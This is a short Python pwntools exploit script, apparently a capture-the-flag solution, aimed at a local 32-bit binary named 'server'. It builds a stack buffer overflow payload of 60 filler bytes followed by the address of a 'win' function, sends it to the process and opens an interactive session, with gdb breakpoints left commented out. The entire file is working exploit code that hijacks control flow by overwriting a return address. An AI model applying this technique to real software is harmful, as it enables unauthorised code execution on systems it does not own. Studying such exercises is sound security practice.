from pwn import *

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
binary = ELF("./server")
#libc = ELF("libc6_2.27-3ubuntu1_i386.so")
env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc6_2.27-3ubuntu1_i386.so")}

p = process("./server")
#p = gdb.debug("./server", '''
#break *main
#break *vuln
#break *0x08048623
#''', env=env)


win = 0x08048586

payload = ''
payload += 'A' * 60
payload += p32(win)

p.sendline(payload)
p.interactive()
